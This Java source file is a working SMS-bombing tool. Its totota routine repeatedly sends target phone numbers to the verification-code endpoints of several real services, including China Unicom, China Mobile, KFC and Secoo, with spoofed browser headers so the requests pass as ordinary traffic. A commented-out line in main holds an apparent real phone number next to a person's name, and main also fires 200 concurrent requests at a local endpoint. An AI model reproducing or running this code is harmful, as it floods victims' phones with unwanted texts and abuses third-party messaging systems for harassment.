package cn.com.test;

import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.google.common.base.Stopwatch;
import com.google.gson.Gson;

import me.money.type.object.pool.Pools;
import okhttp3.FormBody;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class ToToTa {
	private static Logger logger = LoggerFactory.getLogger(ToToTa.class);
	private static final OkHttpClient client = new OkHttpClient().newBuilder().readTimeout(2, TimeUnit.SECONDS)
			.connectTimeout(2, TimeUnit.SECONDS).build();

	public static void main(String[] args) {
		// List<String> phones = new ArrayList<String>();
		// // phones.add("13120061957");
		// phones.add("13833451966");// 牛解亮
		// totota(phones);

		for (int i = 0; i < 200; i++) {
			Pools.submit(new Runnable() {

				@Override
				public void run() {
					// TODO Auto-generated method stub
					Request req = new Request.Builder().url("http://localhost:8080/blog/save").build();
					Stopwatch sw = Stopwatch.createStarted();
					try {
						Response res = client.newCall(req).execute();
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
					long elapsed = sw.elapsed(TimeUnit.MILLISECONDS);
					logger.error("耗时： " + elapsed +" ms");
				}
			});
		}
	}

	public static void totota(List<String> phones) {
		ScheduledExecutorService newScheduledThreadPool = Executors.newScheduledThreadPool(1);

		newScheduledThreadPool.scheduleAtFixedRate(new Runnable() {

			@Override
			public void run() {
				maozhua(phones);
				// liantong(phones);
				// yidong(phones);
				// kfc(phones);
				// secoo(phones);
				// fenxiangxiaoke(phones);
			}
		}, 2, 65, TimeUnit.SECONDS);
	}

	/**
	 * 猫爪直播
	 */
	public static void maozhua(List<String> phones) {
		final String url = "http://user.maobotv.com/login/sms?moblie=%s";
		for (String phone : phones) {
			try {
				String localurl = String.format(url, phone);
				Request req = new Request.Builder().url(localurl).build();
				Response res = client.newCall(req).execute();
				if (res.isSuccessful()) {
					String resString = res.body().string();
					logger.error(String.format("猫爪-totota %s-%s", phone, resString));
				} else {
					logger.error(String.format("猫爪-totota %s failed", phone));
				}
			} catch (IOException e) {
				logger.error("", e);
			}
		}

	}

	/**
	 * 联通官网
	 */
	public static void liantong(List<String> phones) {
		final String url = "https://uac.10010.com/portal/Service/SendMSG?callback=jQuery17206117965361085529_1527044890302&req_time=1527044929838&mobile=%s&_=1527044929840";
		for (String phone : phones) {
			try {
				String localurl = String.format(url, phone);
				Request req = new Request.Builder().url(localurl).header("User-Agent",
						"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36")
						.addHeader("Accept",
								"text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01")
						.addHeader("Host", "uac.10010.com").header("X-Requested-With", "XMLHttpRequest").build();
				Response res = client.newCall(req).execute();
				if (res.isSuccessful()) {
					String resString = res.body().string();
					logger.error(String.format("联通-totota %s-%s", phone, resString));
				} else {
					logger.error(String.format("联通-totota %s-failed", phone));
				}
			} catch (IOException e) {
				logger.error("", e);
			}
		}
	}

	/**
	 * 移动官网
	 */
	public static void yidong(List<String> phones) {
		final String url = "https://login.10086.cn/sendRandomCodeAction.action";
		for (String phone : phones) {
			try {
				String localurl = String.format(url, phone);
				RequestBody formBody = new FormBody.Builder().add("userName", phone).add("type", "01")
						.add("channelID", "12034").build();
				Request req = new Request.Builder().url(localurl).header("User-Agent",
						"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36")
						.addHeader("Accept",
								"text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01")
						.addHeader("Host", "login.10086.cn").header("X-Requested-With", "XMLHttpRequest").post(formBody)
						.build();
				Response res = client.newCall(req).execute();
				if (res.isSuccessful()) {
					String resString = res.body().string();
					logger.error(String.format("移动-totota %s-%s", phone, resString));
				} else {
					logger.error(String.format("移动-totota %s-failed", phone));
				}
			} catch (IOException e) {
				logger.error("", e);
			}
		}
	}

	public static void kfc(List<String> phones) {
		final String url = "https://www.4008823823.com.cn/kfcios//sendVerificationCode.action";
		for (String phone : phones) {
			try {
				RequestBody formBody = new FormBody.Builder().add("mobiOrMail", phone).add("scene", "S6")
						.add("event_id", "").add("brower_id", "2b6fd338-38e2-4c17-ba1b-24cc6f32c37d").build();
				Request req = new Request.Builder().url(url).header("User-Agent",
						"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36")
						.addHeader("Accept", "application/json, text/javascript, */*; q=0.01")
						.addHeader("Host", "www.4008823823.com.cn").header("X-Requested-With", "XMLHttpRequest")
						.post(formBody).build();
				Response res = client.newCall(req).execute();
				if (res.isSuccessful()) {
					String resString = res.body().string();
					logger.error(String.format("KFC-totota %s-%s", phone, resString));
				} else {
					logger.error(String.format("KFC-totota %s-failed", phone));
				}
			} catch (IOException e) {
				logger.error("", e);
			}
		}
	}

	public static void fenxiangxiaoke(List<String> phones) {
		final String url = "https://www.fxiaoke.com/FHH/EM0HFRL/Register/BuildValidateCode";
		for (String phone : phones) {
			try {
				Map<String, Object> map = new HashMap<String, Object>();
				map.put("ImageCode", "");
				map.put("Mobile", phone);
				map.put("AreaCode", "+86");
				String json = new Gson().toJson(map);
				RequestBody formBody = FormBody.create(MediaType.parse("application/json;chaset=utf-8"), json);
				//
				Request req = new Request.Builder().url(url).header("User-Agent",
						"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36")
						.addHeader("Accept", "application/json, text/javascript, */*; q=0.01")
						.addHeader(":authority", "www.fxiaoke.com").header("X-Requested-With", "XMLHttpRequest")
						.header("origin", "https://www.fxiaoke.com")
						.header("referer", "https://www.fxiaoke.com/XV/User/register").header(":method", "POST")
						.header(":path", "/FHH/EM0HFRL/Register/BuildValidateCode").header(":method", "POST")
						.header(":scheme", "https").header("content-type", "application/json; charset=UTF-8")
						.post(formBody).build();
				Response res = client.newCall(req).execute();
				if (res.isSuccessful()) {
					String resString = res.body().string();
					logger.error(String.format("fenxiangxiaoke-totota %s-%s", phone, resString));
				} else {
					logger.error(String.format("fenxiangxiaoke-totota %s-failed", phone));
				}
			} catch (IOException e) {
				logger.error("", e);
			}
		}
	}

	// https://user-center.secoo.com/service/appapi/user/msg/send

	public static void secoo(List<String> phones) {
		final String url = "https://user-center.secoo.com/service/appapi/user/msg/send";
		for (String phone : phones) {
			try {
				RequestBody formBody = new FormBody.Builder().add("mobile", phone).add("bid", "9").add("clientId", "3")
						.build();
				Request req = new Request.Builder().url(url).header("User-Agent",
						"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36")
						.addHeader("Accept", "application/json, text/javascript, */*; q=0.01")
						.addHeader("Origin", "https://m.secoo.com").addHeader("Host", "user-center.secoo.com")
						.header("X-Requested-With", "XMLHttpRequest").post(formBody).build();
				Response res = client.newCall(req).execute();
				if (res.isSuccessful()) {
					String resString = res.body().string();
					logger.error(String.format("SECOO-totota %s-%s", phone, resString));
				} else {
					logger.error(String.format("SECOO-totota %s-failed", phone));
				}
			} catch (IOException e) {
				logger.error("", e);
			}
		}
	}
}
